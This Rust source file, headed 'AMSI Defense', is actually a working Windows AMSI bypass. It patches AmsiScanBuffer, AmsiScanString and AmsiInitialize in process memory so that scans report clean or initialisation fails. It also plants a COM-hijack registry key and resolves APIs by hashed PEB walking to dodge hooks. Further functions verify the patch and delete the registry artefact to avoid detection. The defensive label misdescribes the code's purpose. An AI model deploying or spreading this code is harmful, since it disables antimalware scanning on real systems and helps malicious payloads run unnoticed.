// AMSI Defense
#[cfg(windows)]
use std::ptr;

#[cfg(windows)]
pub fn orchestrate_layers() -> bool {
    apply_memory_patch();
    apply_com_hijack();
    set_init_failed_flag();

    if !verify_bypass() {
        // Second attempt if first pass did not take effect
        apply_memory_patch();
    }
    true
}

#[cfg(not(windows))]
pub fn orchestrate_layers() -> bool {
    true
}

/// Patch AmsiScanBuffer in-process with `xor eax,eax; ret` to force AMSI_RESULT_CLEAN.
#[cfg(windows)]
fn apply_memory_patch() {
    use winapi::um::memoryapi::VirtualProtect;
    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};

    unsafe {
        // Use pe_resolve (PEB walk + hash) to avoid IAT-hookable GetModuleHandleW.
        // If amsi.dll is not already loaded, AMSI is not active and there is
        // nothing to patch.
        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
            Some(b) => b as winapi::shared::minwindef::HMODULE,
            None => {
                log::debug!("apply_memory_patch: amsi.dll not loaded — nothing to patch");
                return;
            }
        };
        let hmod = hmod_base as *mut winapi::ctypes::c_void;

        // Resolve AmsiScanBuffer via hash
        let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
        let scan_buf = match pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_buf_hash)
        {
            Some(addr) => addr as *mut winapi::ctypes::c_void,
            None => {
                log::warn!("apply_memory_patch: AmsiScanBuffer not found");
                return;
            }
        };

        // xor eax, eax (0x31 0xC0) ; ret (0xC3)
        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
        let mut old_protect: u32 = 0;
        if VirtualProtect(
            scan_buf as _,
            patch.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) != 0
        {
            std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_buf as *mut u8, patch.len());
            VirtualProtect(scan_buf as _, patch.len(), old_protect, &mut old_protect);
            log::debug!("apply_memory_patch: AmsiScanBuffer patched");
        } else {
            log::warn!(
                "apply_memory_patch: VirtualProtect failed: {}",
                winapi::um::errhandlingapi::GetLastError()
            );
        }

        // Also patch AmsiScanString
        let scan_str_hash = pe_resolve::hash_str(b"AmsiScanString\0");
        if let Some(scan_str_addr) =
            pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_str_hash)
        {
            let scan_str = scan_str_addr as *mut winapi::ctypes::c_void;
            let mut op: u32 = 0;
            if VirtualProtect(scan_str as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut op) != 0 {
                std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_str as *mut u8, patch.len());
                VirtualProtect(scan_str as _, patch.len(), op, &mut op);
            }
        }
        let _ = hmod;
    }
}

#[cfg(windows)]
fn apply_com_hijack() {
    use winapi::um::winreg::{RegCreateKeyExA, RegSetValueExA, HKEY_CURRENT_USER};

    let subkey =
        b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
    // Point to a nonexistent path so AMSI COM initialisation fails cleanly (2.11)
    let default_val = b"C:\\Windows\\System32\\amsi_disabled.dll\0";

    unsafe {
        let mut hkey = ptr::null_mut();
        if RegCreateKeyExA(
            HKEY_CURRENT_USER,
            subkey.as_ptr() as _,
            0,
            ptr::null_mut(),
            0,
            winapi::um::winnt::KEY_WRITE,
            ptr::null_mut(),
            &mut hkey,
            ptr::null_mut(),
        ) == 0
        {
            RegSetValueExA(
                hkey,
                ptr::null(),
                0,
                winapi::um::winnt::REG_SZ,
                default_val.as_ptr(),
                (default_val.len() - 1) as u32,
            );
            winapi::um::winreg::RegCloseKey(hkey);
        }
    }
}

/// Remove the registry key created by `apply_com_hijack` to avoid leaving a
/// detectable COM-hijack artefact after the bypass is no longer needed.
#[cfg(windows)]
pub fn cleanup_com_hijack() {
    use winapi::um::winreg::{RegDeleteKeyA, HKEY_CURRENT_USER};
    // Delete leaf key first; parent keys are harmless to leave (they are empty
    // standard Windows registry nodes).
    let leaf =
        b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
    let parent = b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\0";
    unsafe {
        RegDeleteKeyA(HKEY_CURRENT_USER, leaf.as_ptr() as _);
        RegDeleteKeyA(HKEY_CURRENT_USER, parent.as_ptr() as _);
    }
}

/// Set the g_AmsiContext initialization flag to indicate failure so any
/// AmsiInitialize call in the current process reports an error.
#[cfg(windows)]
fn set_init_failed_flag() {
    use winapi::um::memoryapi::VirtualProtect;

    unsafe {
        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
            Some(b) => b,
            None => return,
        };

        // AmsiInitialize is __fastcall on x64; the caller cleans the stack so
        // a single-byte RET (0xC3) is the correct return form.
        // mov eax, 0x80004005 ; ret  => B8 05 40 00 80 C3
        let init_hash = pe_resolve::hash_str(b"AmsiInitialize\0");
        let init_fn = match pe_resolve::get_proc_address_by_hash(hmod_base, init_hash) {
            Some(addr) => addr as *mut winapi::ctypes::c_void,
            None => return,
        };

        let patch: [u8; 6] = [
            0xB8, 0x05, 0x40, 0x00, 0x80, // mov eax, 0x80004005 (E_FAIL)
            0xC3, // ret
        ];
        let mut old: u32 = 0;
        if VirtualProtect(
            init_fn as _,
            patch.len(),
            winapi::um::winnt::PAGE_EXECUTE_READWRITE,
            &mut old,
        ) != 0
        {
            std::ptr::copy_nonoverlapping(patch.as_ptr(), init_fn as *mut u8, patch.len());
            VirtualProtect(init_fn as _, patch.len(), old, &mut old);
            log::debug!("set_init_failed_flag: AmsiInitialize patched to return E_FAIL");
        }
    }
}

/// Verify AMSI bypass by checking that AmsiScanBuffer starts with our patch bytes.
#[cfg(windows)]
pub fn verify_bypass() -> bool {
    unsafe {
        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
            Some(b) => b,
            None => return true, // amsi.dll not loaded = bypass trivially successful
        };

        let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
        let scan_buf = match pe_resolve::get_proc_address_by_hash(hmod_base, scan_buf_hash) {
            Some(addr) => addr as *const u8,
            None => return true,
        };

        // Read 5 bytes so we can check the full mov eax,imm32 + ret form.
        let bytes = std::slice::from_raw_parts(scan_buf, 5);
        // Patched forms:
        //   31 C0 C3                 (xor eax,eax ; ret)
        //   33 C0 C3                 (xor eax,eax alt encoding ; ret)
        //   B8 00 00 00 00 + C3      (mov eax,0  ; ret) — 5 bytes shown here
        let patched = (bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
            || (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
            || (bytes[0] == 0xB8
                && bytes[1] == 0x00
                && bytes[2] == 0x00
                && bytes[3] == 0x00
                && bytes[4] == 0x00);

        if !patched {
            log::warn!("verify_bypass: AmsiScanBuffer does not appear patched (bytes: {:02x} {:02x} {:02x} {:02x} {:02x})",
                bytes[0], bytes[1], bytes[2], bytes[3], bytes[4]);
        }
        patched
    }
}

#[cfg(not(windows))]
pub fn verify_bypass() -> bool {
    true
}
